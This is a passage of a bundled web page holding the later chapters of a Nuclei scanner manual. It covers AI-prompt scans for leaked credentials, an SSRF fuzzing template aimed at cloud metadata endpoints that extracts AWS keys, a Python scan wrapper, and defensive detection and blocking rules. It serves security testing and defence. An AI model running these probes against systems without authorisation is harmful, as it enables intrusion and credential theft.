logs, authentication tokens, and misconfigurations"\n\n# Credential discovery in JavaScript\ndocker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Find hardcoded API keys, JWT tokens, OAuth credentials, and authentication secrets in JavaScript"\n\n# Cloud credential exposure\ndocker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Identify hardcoded cloud service credentials (AWS, GCP, Azure) in JavaScript files"\n\n# API endpoint discovery\ndocker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Find internal API endpoints (REST, GraphQL, WebSockets) hidden in JavaScript files"\n\n# Payment API key exposure\ndocker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Identify exposed payment API keys for Stripe, PayPal, and Square in JavaScript files"\n\n# Database credential exposure\ndocker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Find Firebase, MongoDB, and Elasticsearch credentials in JavaScript"\n\n# Source map exposure\ndocker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Find exposed JavaScript source maps (.map files) revealing original source code"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"195-cloud-security-assessment-with-ai",children:"19.5 Cloud Security Assessment with AI"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Docker and Kubernetes exposure detection\nnuclei -list targets.txt -ai "Scan for open Docker Engine API endpoints that permit remote control or container enumeration"\n\n# Kubernetes API discovery\nnuclei -list targets.txt -ai "Identify unauthenticated Kubernetes API servers accessible over the internet"\n\n# Kubernetes Dashboard exposure\nnuclei -list targets.txt -ai "Locate publicly accessible Kubernetes Dashboard interfaces with weak or missing authentication"\n\n# Cloud metadata endpoints\nnuclei -list targets.txt -ai "Search for cloud provider metadata endpoints (e.g., AWS, Azure, GCP) that respond from web-facing services"\n\n# Cloud storage misconfiguration\nnuclei -list targets.txt -ai "Identify exposed S3 buckets, GCP buckets, and Azure blobs with insecure permissions (public read/write or misconfigured ACLs)"\n\n# Cloud credential exposure\nnuclei -list targets.txt -ai "Extract AWS access keys or secrets found in HTTP responses with precision filters"\n\n# Azure credential discovery\nnuclei -list targets.txt -ai "Extract Azure Storage access keys leaked in HTTP responses, reducing false positives"\n\n# GCP credential detection\nnuclei -list targets.txt -ai "Detect Google Cloud credentials exposed in HTTP responses and filter false positives using key structure"\n\n# CI/CD exposure detection\nnuclei -list targets.txt -ai "Detect exposed CI/CD configurations (GitHub Actions, GitLab CI, CircleCI) in .yml files"\n\n# Infrastructure as Code exposure\nnuclei -list targets.txt -ai "Identify web apps leaking Terraform or CloudFormation configurations"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"196-ai-template-development-and-customization",children:"19.6 AI Template Development and Customization"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'# AI-Generated Template Example for Advanced SSRF Detection\nid: ai-advanced-ssrf-detection\n\ninfo:\n  name: AI-Generated Advanced SSRF Detection\n  author: nuclei-ai\n  severity: high\n  description: AI-powered SSRF detection with multiple attack vectors\n  classification:\n    cwe-id: CWE-918\n  tags: ssrf,ai-generated,server-side\n\nvariables:\n  internal_ips:\n    - "127.0.0.1"\n    - "localhost"\n    - "169.254.169.254"\n    - "10.0.0.1"\n    - "192.168.1.1"\n    - "172.16.0.1"\n  \n  ssrf_params:\n    - "url"\n    - "link"\n    - "redirect"\n    - "next"\n    - "callback"\n    - "feed"\n    - "src"\n    - "path"\n\nhttp:\n  - method: GET\n    path:\n      - "{{BaseURL}}"\n    \n    fuzzing:\n      - part: query\n        type: replace\n        mode: multiple\n        fuzz:\n          - "{{ssrf_params}}={{internal_ips}}"\n          - "{{ssrf_params}}=http://{{internal_ips}}"\n          - "{{ssrf_params}}=https://{{internal_ips}}"\n    \n    matchers-condition: or\n    matchers:\n      - type: word\n        words:\n          - "IAM role"\n          - "security-credentials"\n          - "compute metadata"\n          - "instance-id"\n        condition: or\n      \n      - type: regex\n        regex:\n          - "\\"AccessKeyId\\"\\\\s*:\\\\s*\\"[A-Z0-9]{16,}\\""\n          - "\\"SecretAccessKey\\"\\\\s*:\\\\s*\\"[A-Za-z0-9/+=]{40}\\""\n        condition: or\n      \n      - type: dsl\n        dsl:\n          - "contains(body, \'private\') && contains(body, \'ip\')"\n          - "contains(body, \'internal\') && response_time > 3000"\n        condition: or\n\n  - method: POST\n    path:\n      - "{{BaseURL}}/api/fetch"\n      - "{{BaseURL}}/proxy"\n      - "{{BaseURL}}/redirect"\n    \n    headers:\n      Content-Type: "application/json"\n    \n    body: |\n      {"url": "http://{{internal_ips}}", "callback": "http://{{internal_ips}}/test"}\n    \n    attack: batteringram\n    threads: 5\n    \n    matchers:\n      - type: status\n        status:\n          - 200\n        condition: and\n      - type: word\n        words:\n          - "successfully"\n          - "fetched"\n          - "loaded"\n        condition: or\n\n# Extractors for intelligence gathering\nextractors:\n  - type: regex\n    name: metadata_endpoints\n    regex:\n      - "(http://169\\\\.254\\\\.169\\\\.254[^\\\\s\\"\']*)"\n    group: 1\n  \n  - type: regex\n    name: internal_services\n    regex:\n      - "(http://(?:127\\\\.0\\\\.0\\\\.1|localhost|10\\\\.[0-9.]+|192\\\\.168\\\\.[0-9.]+|172\\\\.(?:1[6-9]|2[0-9]|3[01])\\\\.[0-9.]+):[0-9]+[^\\\\s\\"\']*)"\n    group: 1\n'})}),"\n",(0,s.jsx)(n.h3,{id:"197-ai-prompt-engineering-for-security-testing",children:"19.7 AI Prompt Engineering for Security Testing"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"# Python framework for AI-driven security testing\nimport subprocess\nimport json\nimport time\nfrom typing import List, Dict\n\nclass NucleiAITester:\n    def __init__(self, api_key: str):\n        self.api_key = api_key\n        self.setup_environment()\n    \n    def setup_environment(self):\n        \"\"\"Setup environment variables for AI functionality\"\"\"\n        import os\n        os.environ['PDCP_API_KEY'] = self.api_key\n    \n    def generate_context_aware_prompts(self, target_type: str, vulnerability_class: str) -> List[str]:\n        \"\"\"Generate context-aware AI prompts based on target and vulnerability type\"\"\"\n        prompt_templates = {\n            'web_app': {\n                'xss': [\n                    \"Fuzz all parameters and HTTP methods using DSL to detect XSS vulnerabilities, including reflected, stored, and DOM-based variants, applying context-aware pre-conditions\",\n                    \"Test for reflected XSS in user-controllable parameters such as q, search, s, redirect, return, and url by injecting JavaScript payloads and observing output\",\n                    \"Identify stored XSS in comment fields, usernames, profile descriptions with persistent payload validation\"\n                ],\n                'sqli': [\n                    \"Perform fuzzing on all parameters and HTTP methods using DSL, focusing on detecting SQL Injection vulnerabilities with pre-conditions\",\n                    \"Search for database error responses indicating SQL query issues with error pattern matching\",\n                    \"Use time delay techniques to detect time-based SQLi in all request parameters with response time analysis\"\n                ],\n                'ssrf': [\n                    \"Perform fuzzing on all HTTP parameters and methods using DSL, focusing on detecting SSRF vulnerabilities with pre-condition checks like internal IP ranges, URL redirects, and response behaviors\",\n                    \"Detect SSRF in common URL-related parameters like 'url', 'link', 'redirect', 'next', 'feed', and 'callback' by injecting payloads targeting internal services and metadata endpoints\",\n                    \"Identify SSRF in API endpoints that fetch external resources, including indirect references such as file uploads, image fetchers, and URL previews\"\n                ]\n            },\n            'api': {\n                'injection': [\n                    \"Probe JSON-based API endpoints for injectable fields susceptible to SQL injection with API-specific payload formatting\",\n                    \"Inject XSS payloads into JSON fields of API requests and responses to find injection points vulnerable to script execution\",\n                    \"Test GraphQL endpoints for injection vulnerabilities through query parameter manipulation\"\n                ],\n                'auth': [\n                    \"Check for APIs allowing unauthenticated access to admin routes with permission bypass testing\",\n                    \"Identify JWT token manipulation vulnerabilities in API authentication flows\",\n                    \"Test for API key exposure and authentication bypass scenarios\"\n                ]\n            },\n            'cloud': {\n                'misconfig': [\n                    \"Identify exposed S3 buckets, GCP buckets, and Azure blobs with insecure permissions (public read/write or misconfigured ACLs)\",\n                    \"Extract AWS access keys or secrets found in HTTP responses with precision filters\",\n                    \"Detect Google Cloud credentials exposed in HTTP responses and filter false positives using key structure\"\n                ],\n                'container': [\n                    \"Scan for open Docker Engine API endpoints that permit remote control or container enumeration\",\n                    \"Identify unauthenticated Kubernetes API servers accessible over the internet\",\n                    \"Locate publicly accessible Kubernetes Dashboard interfaces with weak or missing authentication\"\n                ]\n            }\n        }\n        \n        return prompt_templates.get(target_type, {}).get(vulnerability_class, [])\n    \n    def execute_ai_scan(self, targets: List[str], prompt: str, output_format: str = 'json') -> Dict:\n        \"\"\"Execute AI-powered nuclei scan with custom prompts\"\"\"\n        cmd = [\n            'nuclei',\n            '-list', 'targets.txt',\n            '-ai', prompt,\n            '-json' if output_format == 'json' else '-jsonl',\n            '-silent'\n        ]\n        \n        # Write targets to file\n        with open('targets.txt', 'w') as f:\n            for target in targets:\n                f.write(f\"{target}\\n\")\n        \n        try:\n            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\n            if result.stdout:\n                if output_format == 'json':\n                    return {'results': [json.loads(line) for line in result.stdout.strip().split('\\n') if line]}\n                else:\n                    return {'raw_output': result.stdout}\n            return {'results': []}\n        except subprocess.TimeoutExpired:\n            return {'error': 'Scan timeout exceeded'}\n        except Exception as e:\n            return {'error': str(e)}\n    \n    def intelligent_security_assessment(self, targets: List[str], assessment_type: str = 'comprehensive') -> Dict:\n        \"\"\"Perform intelligent security assessment using AI-driven prompts\"\"\"\n        results = {}\n        \n        assessment_workflows = {\n            'comprehensive': [\n                ('reconnaissance', 'Extract page title, detect technologies and versions'),\n                ('xss_detection', 'Fuzz all parameters and HTTP methods using DSL to detect XSS vulnerabilities, including reflected, stored, and DOM-based variants'),\n                ('sqli_detection', 'Perform fuzzing on all parameters and HTTP methods using DSL, focusing on detecting SQL Injection vulnerabilities with pre-conditions'),\n                ('ssrf_detection', 'Perform fuzzing on all HTTP parameters and methods using DSL, focusing on detecting SSRF vulnerabilities with pre-condition checks'),\n                ('config_exposure', 'Find exposed configuration files containing sensitive information such as credentials, API keys, database passwords'),\n                ('admin_panels', 'Identify exposed admin panels of popular CMS (WordPress, Joomla, Magento, OpenCart, etc.)')\n            ],\n            'api_focused': [\n                ('api_discovery', 'Find exposed Swagger, Redocly, GraphiQL, and API Blueprint documentation'),\n                ('api_injection', 'Probe JSON-based API endpoints for injectable fields susceptible to SQL injection'),\n                ('api_auth', 'Check for APIs allowing unauthenticated access to admin routes'),\n                ('api_exposure', 'Identify commonly used API endpoints that expose sensitive user data')\n            ],\n            'cloud_security': [\n                ('cloud_storage', 'Identify exposed S3 buckets, GCP buckets, and Azure blobs with insecure permissions'),\n                ('cloud_credentials', 'Extract AWS access keys or secrets found in HTTP responses with precision filters'),\n                ('container_exposure', 'Scan for open Docker Engine API endpoints that permit remote control'),\n                ('k8s_exposure', 'Identify unauthenticated Kubernetes API servers accessible over the internet')\n            ]\n        }\n        \n        workflow = assessment_workflows.get(assessment_type, assessment_workflows['comprehensive'])\n        \n        for test_name, prompt in workflow:\n            print(f\"[+] Executing {test_name}...\")\n            result = self.execute_ai_scan(targets, prompt)\n            results[test_name] = result\n            time.sleep(2)  # Rate limiting\n        \n        return results\n    \n    def generate_ai_report(self, results: Dict, target: str) -> str:\n        \"\"\"Generate comprehensive AI-driven security assessment report\"\"\"\n        report = f\"\"\"\n# AI-Powered Security Assessment Report\n\n## Target: {target}\n## Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n## Executive Summary\n\"\"\"\n        \n        total_findings = 0\n        critical_findings = 0\n        \n        for test_type, test_results in results.items():\n            if 'results' in test_results:\n                findings_count = len(test_results['results'])\n                total_findings += findings_count\n                \n                critical_count = sum(1 for finding in test_results['results'] \n                                   if finding.get('info', {}).get('severity') == 'critical')\n                critical_findings += critical_count\n                \n                report += f\"\\n### {test_type.replace('_', ' ').title()}\\n\"\n                report += f\"- Findings: {findings_count}\\n\"\n                report += f\"- Critical: {critical_count}\\n\"\n        \n        report += f\"\\n## Overall Statistics\\n\"\n        report += f\"- Total Findings: {total_findings}\\n\"\n        report += f\"- Critical Issues: {critical_findings}\\n\"\n        \n        return report\n\n# Usage Example\nif __name__ == \"__main__\":\n    # Initialize AI tester with API key\n    ai_tester = NucleiAITester(\"your_pdcp_api_key\")\n    \n    # Define targets for testing\n    targets = [\"https://example.com\", \"https://api.example.com\"]\n    \n    # Perform comprehensive AI-driven assessment\n    results = ai_tester.intelligent_security_assessment(targets, 'comprehensive')\n    \n    # Generate and save report\n    report = ai_tester.generate_ai_report(results, \"example.com\")\n    with open('ai_security_report.md', 'w') as f:\n        f.write(report)\n    \n    print(\"AI-powered security assessment completed!\")\n"})}),"\n",(0,s.jsx)(n.h3,{id:"198-ai-template-validation-and-quality-assurance",children:"19.8 AI Template Validation and Quality Assurance"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Validate AI-generated templates before deployment\nnuclei -t ai-generated-template.yaml -validate\n\n# Test AI templates against known vulnerable targets\nnuclei -u http://vulnerable-target.com -t ai-generated-template.yaml -debug\n\n# Template optimization using AI feedback\nnuclei -t ai-template.yaml -u target.com -debug-req -debug-resp\n\n# Bulk validation of AI-generated templates\nfind ai-templates/ -name "*.yaml" -exec nuclei -t {} -validate \\;\n\n# Community contribution workflow for AI templates\ngit clone https://github.com/projectdiscovery/nuclei-templates-ai\ncd nuclei-templates-ai\n# Review AI-generated template\n# Test against vulnerable environment\n# Submit PR with validation results\n'})}),"\n",(0,s.jsx)(n.h3,{id:"199-advanced-ai-security-testing-scenarios",children:"19.9 Advanced AI Security Testing Scenarios"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Cache poisoning detection with AI\nnuclei -list targets.txt -ai "Test for web cache poisoning via manipulation of \'Host\', \'X-Forwarded-Host\', and \'X-Forwarded-For\' headers, using multi-step validation"\n\n# Host header injection testing\nnuclei -list targets.txt -ai "Detect Host Header Injection with password reset bypass and SSRF vector analysis"\n\n# XXE vulnerability detection\nnuclei -list katana.jsonl -im jsonl -ai "Fuzz all XML-based input fields using DSL to identify XXE injection points, with pre-conditions for triggering external entity processing"\n\n# Command injection detection\nnuclei -list katana.jsonl -im jsonl -ai "Perform fuzzing on all parameters and HTTP methods using DSL, focusing on detecting Remote Code Execution (Command Injection) vulnerabilities"\n\n# Advanced CORS misconfiguration\nnuclei -list targets.txt -ai "Find misconfigured CORS policies allowing wildcard origins with credential access implications"\n\n# Business logic flaw detection\nnuclei -list targets.txt -ai "Identify business logic flaws in payment processing, user registration, and privilege escalation scenarios"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"1910-integration-with-ai-security-platforms",children:"19.10 Integration with AI Security Platforms"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"# Integration with multiple AI security platforms\nclass MultiAISecurityPlatform:\n    def __init__(self):\n        self.platforms = {\n            'nuclei_ai': self.nuclei_ai_scan,\n            'openai_security': self.openai_security_analysis,\n            'custom_ml': self.custom_ml_analysis\n        }\n    \n    def nuclei_ai_scan(self, targets: List[str], prompt: str) -> Dict:\n        \"\"\"Execute Nuclei AI-powered scan\"\"\"\n        cmd = ['nuclei', '-list', 'targets.txt', '-ai', prompt, '-json']\n        # Implementation details...\n        return {'platform': 'nuclei_ai', 'results': []}\n    \n    def openai_security_analysis(self, targets: List[str], context: str) -> Dict:\n        \"\"\"Integrate with OpenAI for security analysis\"\"\"\n        # Custom implementation using OpenAI API\n        return {'platform': 'openai', 'analysis': []}\n    \n    def custom_ml_analysis(self, targets: List[str], model_type: str) -> Dict:\n        \"\"\"Custom ML-based security analysis\"\"\"\n        # Implementation for custom ML models\n        return {'platform': 'custom_ml', 'predictions': []}\n    \n    def comprehensive_ai_assessment(self, targets: List[str]) -> Dict:\n        \"\"\"Run assessment across multiple AI platforms\"\"\"\n        results = {}\n        \n        for platform_name, platform_func in self.platforms.items():\n            try:\n                result = platform_func(targets, \"comprehensive security assessment\")\n                results[platform_name] = result\n            except Exception as e:\n                results[platform_name] = {'error': str(e)}\n        \n        return results\n\n# Usage\nmulti_ai = MultiAISecurityPlatform()\ncomprehensive_results = multi_ai.comprehensive_ai_assessment([\"https://example.com\"])\n"})}),"\n",(0,s.jsx)(n.p,{children:"This comprehensive AI capabilities section demonstrates how Nuclei's artificial intelligence features can revolutionize security testing through automated template generation, intelligent vulnerability detection, and context-aware security assessment workflows."}),"\n",(0,s.jsx)(n.h2,{id:"20-monitoring-and-defensive-considerations",children:"20. Monitoring and Defensive Considerations"}),"\n",(0,s.jsx)(n.p,{children:"Defensive strategies should be implemented to detect unauthorized scanning activities while maintaining operational security for legitimate testing."}),"\n",(0,s.jsx)(n.h3,{id:"201-detection-signatures",children:"20.1 Detection Signatures"}),"\n",(0,s.jsx)(n.p,{children:"Security teams should monitor for the following Nuclei-related indicators:"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Network Pattern Analysis:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"High-frequency HTTP requests to multiple endpoints"}),"\n",(0,s.jsx)(n.li,{children:'Requests with uncommon User-Agent strings containing "Nuclei"'}),"\n",(0,s.jsx)(n.li,{children:"Sequential testing of common vulnerability patterns"}),"\n",(0,s.jsx)(n.li,{children:"Rapid enumeration of directory structures and files"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Request Behavior Analysis:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"HTTP requests with specific header patterns used by Nuclei"}),"\n",(0,s.jsx)(n.li,{children:"POST requests with common SQL injection payloads"}),"\n",(0,s.jsx)(n.li,{children:"Requests to security-sensitive endpoints (admin, config, etc.)"}),"\n",(0,s.jsx)(n.li,{children:"Error response pattern analysis for vulnerability probing"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Traffic Volume Indicators:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Unusual request volume from single source IPs"}),"\n",(0,s.jsx)(n.li,{children:"Consistent timing patterns in request intervals"}),"\n",(0,s.jsx)(n.li,{children:"Multiple requests to non-existent resources (404 patterns)"}),"\n",(0,s.jsx)(n.li,{children:"Cross-site request patterns indicating lateral scanning"}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"202-defensive-countermeasures",children:"20.2 Defensive Countermeasures"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Rate limiting implementation\niptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT\n\n# Request pattern blocking\n# Block common Nuclei User-Agent\nnginx: if ($http_user_agent ~* "nuclei") { return 403; }\n\n# IP reputation monitoring\nfail2ban-regex /var/log/nginx/access.log "nuclei|security scanner|vulnerability"\n\n# Honeypot deployment for scanner detection\n# Deploy fake admin panels and vulnerable endpoints\nlocation /admin {\n    access_log /var/log/honeypot.log;\n    return 200 "Admin Login";\n}\n'})}),"\n",(0,s.jsx)(n.h3,{id:"203-response-and-mitigation-strategies",children:"20.3 Response and Mitigation Strategies"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'# SIEM Detection Rule Example (Splunk)\nsearch: |\n  index=web_access\n  | eval is_nuclei=if(match(user_agent, "(?i)nuclei"), 1, 0)\n  | eval is_scan_pattern=if(match(uri_path, "(?i)(admin|config|backup|test)"), 1, 0)\n  | eval high_frequency=if(count > 100, 1, 0)\n  | where is_nuclei=1 OR (is_scan_pattern=1 AND high_frequency=1)\n  | stats count by src_ip, user_agent\n  | where count > 50\n\n# Automated Response Script\n#!/bin/bash\nSCAN_THRESHOLD=100\nLOG_FILE="/var/log/access.log"\nBLOCKED_IPS="/tmp/blocked_ips.txt"\n\nwhile IFS= read -r line; do\n    IP=$(echo "$line" | awk \'{print $1}\')\n    REQUESTS=$(grep "$IP" "$LOG_FILE" | wc -l)\n    \n    if [ "$REQUESTS" -gt "$SCAN_THRESHOLD" ]; then\n        echo "$IP" >> "$BLOCKED_IPS"\n        iptables -A INPUT -s "$IP" -j DROP\n        logger "Blocked IP $IP for excessive scanning ($REQUESTS requests)"\n    fi\ndone < <(tail -f "$LOG_FILE")\n'})}),"\n",(0,s.jsx)(n.h2,{id:"conclusion",children:"Conclusion"}),"\n",(0,s.jsx)(n.p,{children:"This comprehensive Nuclei reference manual provides security practitioners with the knowledge and tools necessary to implement effective vulnerability scanning programs. The techniques and methodologies described represent current best practices for automated security assessment, enabling organizations to proactively identify and remediate security vulnerabilities."}),"\n",(0,s.jsx)(n.p,{children:"The evolution of the threat landscape requires continuous adaptation of scanning methodologies and template development. Future research should focus on machine learning-enhanced template generation, cloud-native security assessment capabilities, and integration with emerging DevSecOps workflows."}),"\n",(0,s.jsx)(n.p,{children:"Security practitioners must balance the offensive capabilities of Nuclei with responsible disclosure practices, comprehensive documentation, and adherence to legal and ethical guidelines to ensure the advancement of cybersecurity while maintaining trust and accountability."}),"\n",(0,s.jsx)(n.h2,{id:"references",children:"References"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://docs.nuclei.sh/",children:"Nuclei Official Documentation"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://github.com/projectdiscovery/nuclei",children:"ProjectDiscovery Nuclei GitHub Repository"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://github.com/projectdiscovery/nuclei-templates",children:"Nuclei Templates Repository"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://owasp.org/www-project-web-security-testing-guide/",children:"OWASP Testing Guide"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf",children:"NIST Special Publication 800-115: Technical Guide to Information Security Testing"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://www.cvedetails.com/",children:"CVE Details Database"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://attack.mitre.org/",children:"MITRE ATT&CK Framework"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://blog.projectdiscovery.io/ultimate-nuclei-guide/",children:"ProjectDiscovery Blog: Ultimate Nuclei Guide"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://nuclei.projectdiscovery.io/templating-guide/",children:"Nuclei Template Creation Guide"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://yaml.org/spec/1.2/spec.html",children:"YAML Specification"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://tools.ietf.org/html/rfc7230",children:"HTTP/1.1 Specification (RFC 7230)"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://tools.ietf.org/html/rfc1035",children:"DNS Protocol Specification (RFC 1035)"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://tools.ietf.org/html/rfc8446",children:"TLS 1.3 Specification (RFC 8446)"})}),"\n"]})]})}function u(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}}}]);